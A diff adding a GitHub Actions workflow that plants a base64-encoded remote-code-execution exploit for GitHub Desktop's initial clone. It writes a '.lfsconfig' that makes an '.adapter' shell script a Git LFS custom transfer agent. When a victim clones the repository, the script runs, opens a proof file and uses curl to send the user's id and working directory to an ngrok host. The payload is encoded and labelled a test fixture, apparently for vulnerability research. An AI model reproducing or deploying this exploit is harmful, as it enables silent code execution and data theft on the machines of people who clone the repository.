@@ -1,0 +1,30 @@
+name: Install GitHub Desktop initial-clone fixture
+on:
+  push:
+permissions:
+  contents: write
+jobs:
+  bootstrap:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Commit one-click Clone fixture
+        env:
+          ADAPTER_B64: IyEvYmluL3NoCnNldCAtZXUKCnByb29mX2ZpbGU9Ii90bXAvR2l0SHViLURlc2t0b3AtQ2xvbmUtUkNFLVByb29mLnR4dCIKb25jZV9kaXI9Ii90bXAvR2l0SHViLURlc2t0b3AtQ2xvbmUtUkNFLVByb29mLm9uY2UiCgppZiBta2RpciAiJG9uY2VfZGlyIiAyPi9kZXYvbnVsbDsgdGhlbgogIHsKICAgIHByaW50ZiAnR0lUSFVCIERFU0tUT1AgQ0xPTkUgUkNFIENPTkZJUk1FRFxuXG4nCiAgICBwcmludGYgJ1JlcG9zaXRvcnktY29udHJvbGxlZCBjb2RlIGV4ZWN1dGVkIGF1dG9tYXRpY2FsbHkgZHVyaW5nIENsb25lLlxuXG4nCiAgICBwcmludGYgJ1RpbWU6ICVzXG4nICIkKGRhdGUgLXUgJyslWS0lbS0lZFQlSDolTTolU1onKSIKICAgIHByaW50ZiAnVXNlcjogJXNcbicgIiQoaWQpIgogICAgcHJpbnRmICdXb3JraW5nIGRpcmVjdG9yeTogJXNcbicgIiRQV0QiCiAgICBwcmludGYgJ0dpdCBMRlM6ICVzXG4nICIkKGdpdCBsZnMgdmVyc2lvbiAyPiYxKSIKICAgIHByaW50ZiAnXG5ObyBjb21tYW5kIHdhcyBydW4gYWZ0ZXIgY2xpY2tpbmcgQ2xvbmUuXG4nCiAgfSA+ICIkcHJvb2ZfZmlsZSIKICBvcGVuIC1hIFRleHRFZGl0ICIkcHJvb2ZfZmlsZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKZmkKCmV2aWRlbmNlPSQocHJpbnRmICclc1xuJyBcCiAgJ3Byb2JlPWdpdGh1Yi1kZXNrdG9wLW9uZS1jbGljay1jbG9uZS1yY2UtdmlkZW8nIFwKICAidGltZT0kKGRhdGUgLXUgJyslWS0lbS0lZFQlSDolTTolU1onKSIgXAogICJpZD0kKGlkKSIgXAogICJwd2Q9JFBXRCIgXAogICJnaXRfbGZzX3ZlcnNpb249JChnaXQgbGZzIHZlcnNpb24gMj4mMSkiKQoKY3VybCAtZnNTIFwKICAtSCAnY29udGVudC10eXBlOiB0ZXh0L3BsYWluJyBcCiAgLS1kYXRhLWJpbmFyeSAiJGV2aWRlbmNlIiBcCiAgJ2h0dHBzOi8vNDNlYS0yNjAxLTY0NC04NTgwLWIxMjAtOWQzNC1hOWI3LTM0NTYtNWViLm5ncm9rLWZyZWUuYXBwL2V4ZWN1dGVkJyBcCiAgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKCndoaWxlIElGUz0gcmVhZCAtciBtZXNzYWdlOyBkbwogIGNhc2UgIiRtZXNzYWdlIiBpbgogICAgKiciZXZlbnQiOiJpbml0IicqKQogICAgICBwcmludGYgJ3siZXZlbnQiOiJpbml0In1cbicKICAgICAgOzsKICAgIConImV2ZW50IjoiZG93bmxvYWQiJyopCiAgICAgIG9iamVjdF9wYXRoPSIvdG1wL2dpdGh1Yi1kZXNrdG9wLXZpZGVvLWxmcy1vYmplY3QtJCQiCiAgICAgIHByaW50ZiAnWicgPiAiJG9iamVjdF9wYXRoIgogICAgICBwcmludGYgJ3siZXZlbnQiOiJjb21wbGV0ZSIsIm9pZCI6ImJiZWViZDg3OWUxZGZmNjkxODU0NmRjMGMxNzlmZGRlNTA1ZjJhMjE1OTFjOWE5Yzk2ZTM2YjA1NGVjNWFmODMiLCJwYXRoIjoiJXMifVxuJyAiJG9iamVjdF9wYXRoIgogICAgICA7OwogICAgKiciZXZlbnQiOiJ0ZXJtaW5hdGUiJyopCiAgICAgIGV4aXQgMAogICAgICA7OwogIGVzYWMKZG9uZQo=
+          ATTRIBUTES_B64: ei1sZnMuYmluIGZpbHRlcj1sZnMgZGlmZj1sZnMgbWVyZ2U9bGZzIC10ZXh0Cg==
+          LFSCONFIG_B64: W2xmc10KCXVybCA9IGh0dHBzOi8vNDNlYS0yNjAxLTY0NC04NTgwLWIxMjAtOWQzNC1hOWI3LTM0NTYtNWViLm5ncm9rLWZyZWUuYXBwL2luZm8vbGZzCltsZnMgImN1c3RvbXRyYW5zZmVyLnNlbnRpbmVsLnBhdGgiXQoJYWNjZXNzID0gLi8uYWRhcHRlcgo=
+          POINTER_B64: dmVyc2lvbiBodHRwczovL2dpdC1sZnMuZ2l0aHViLmNvbS9zcGVjL3YxCm9pZCBzaGEyNTY6YmJlZWJkODc5ZTFkZmY2OTE4NTQ2ZGMwYzE3OWZkZGU1MDVmMmEyMTU5MWM5YTljOTZlMzZiMDU0ZWM1YWY4MwpzaXplIDEK
+          README_B64: IyBHaXRIdWIgRGVza3RvcCBpbml0aWFsLWNsb25lIEdpdCBMRlMgdGVzdAoKVGhpcyByZXBvc2l0b3J5IGlzIGFuIGlzb2xhdGVkLCBoYXJtbGVzcyBwcm9vZiBmb3IgdGhlIEdpdCBMRlMgdHJhY2tlZApgLmxmc2NvbmZpZ2AgY3VzdG9tLXRyYW5zZmVyIGV4ZWN1dGlvbiBib3VuZGFyeS4gVGhlIHBheWxvYWQgd3JpdGVzIGFuZCBvcGVucyBhCmxvY2FsIHRleHQgZmlsZSBjb250YWluaW5nIGV4ZWN1dGlvbiBldmlkZW5jZS4K
+        run: |
+          git rm -r --ignore-unmatch .github .yarn adapter package.json
+          printf '%s' "$ADAPTER_B64" | base64 -d > .adapter
+          printf '%s' "$ATTRIBUTES_B64" | base64 -d > .gitattributes
+          printf '%s' "$LFSCONFIG_B64" | base64 -d > .lfsconfig
+          printf '%s' "$POINTER_B64" | base64 -d > z-lfs.bin
+          printf '%s' "$README_B64" | base64 -d > README.md
+          chmod 755 .adapter
+          git config user.name "GitHub Desktop LFS test bootstrap"
+          git config user.email "github-desktop-lfs-test@users.noreply.github.com"
+          git -c filter.lfs.clean= -c filter.lfs.smudge= -c filter.lfs.process= -c filter.lfs.required=false add -A
+          git commit -m "Install GitHub Desktop initial-clone RCE fixture"
+          git push --no-verify
